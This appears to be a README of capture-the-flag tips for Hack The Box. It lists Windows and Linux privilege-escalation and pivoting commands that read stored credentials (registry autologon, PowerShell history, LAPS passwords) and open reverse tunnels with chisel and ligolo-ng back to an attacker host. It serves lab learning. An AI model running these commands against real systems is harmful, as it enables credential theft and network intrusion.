# HTB-tips

## Windows Privilege Escalation - Registry Autologon
Sometimes windows stores credentials in plaintext (DefaultDomainName, DefaultUserName,DefaultPassword)

EXAMPLE USAGE:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```


## Windows Privilege Escalation - Powershell history file
Windows stores the powershell history in a file in the psreadlinefolder.(just like linux stores it under the .bash_history).
```
more C:\users\adam\appdata\roaming\microsoft\windows\powershell\psreadline\*.txt
```

## Linux Privilege Escalation - Dcoker Container Mounted files
A docker conatiner is mounted to a home directory. The docker connects the containers file system to the hosts file system -- live. So any changes in the host file system also affects in the docker and vice versa.If the we get root on the docker conatiner(by default we are root inside the docker) this can result in easy priv esc by setting up the setuid to a any binary.

## Linux Privilege Escalation - Port Forwarding using Chisel
Attacker Machine
```bash
chisel server -p ATTACKER_PORT --reverse
```
Target Machine
```bash
chisel client ATTACKER_IP:ATTACKER_PORT R:LOCAL_PORT:127.0.0.1:PORT_RUNNING_ON_TARGET_MACHINE
```

## Windows Exploitation - Pass the Cert
If we get a .pfx file we can get the cert.pem and key.pem from the .pfx file and try to logging in the machine if winrm service is enabled using pass the cert attack.
Extracting the key and cert
```
openssl pkcs12  -in legacyy_dev_auth.pfx -info -nokeys -out cert.pem
openssl pkcs12  -in legacyy_dev_auth.pfx -info -nocerts -nodes -out key.pem
```
After getting the cert and the key we can log-in
```
evil-winrm -i IP -S -k key.pem -c cert.pem
```

## Windows Credentail Hunting - Member of LAPS Group
LAPS is used to store administrator passwords which are complex and randomized, We can use a lapsdumper from github to extract the administrator password
```
lapsdumper.py -u user -p password -d domain.local
```

## Linux Privilege escalation - ENV variables
Alwyas check for env varibles specially if landed in a docker environment, or any container.
```
env
```

## Linux Privilege escalation - Backup Files
Check for backup files if have permissions in the source code directory or part of any group like sysadm, adm(4)
```
find /path/to/source/code 2>/dev/null | grep -i "*.bak"
```

## Port forwarding Using ssh
If we have a user with ssh creds or public key(id_rsa) we can login and start a local port forwarding, which will forward the ports of the machine to out local machine and we will be able to view the service running on the machine in their internal nertwork
```
ssh -L machineport:ourmachineip:ourmachineport user@machine.local
```

## Exploiatation - Extract username from a public ssh key (id_rsa)
If we got a users id_rsa ssh key and we dont know the user which the public key is of, we can extract the username from the key by decrypting the keys and reading the hex dump, at the very end we can find the user and the machine which the key belongs to.
```
cat id_rsa | base64 -d | xxd
```

## Pivoting into a network - Ligolo-ng
Suppose we got a rce on a machine which is faced towards internet and also have a internal network (ex; 192.168.2.0/24) and we want to connect to that machine to enum further.

Attacker machine(kali linux)
```
sudo ip tuntap add user <user> mode tun ligolo
sudo ip link set ligolo up
sudo ip route del 192.168.2.0/24 dev ligolo
```
```
./proxy --selfcert 
```
```
ligolo> session 1
ligolo> start
```

Victim machine (ubnutu)
```
./agent -connect <kaliip:kaliport> --ignore-cert
```
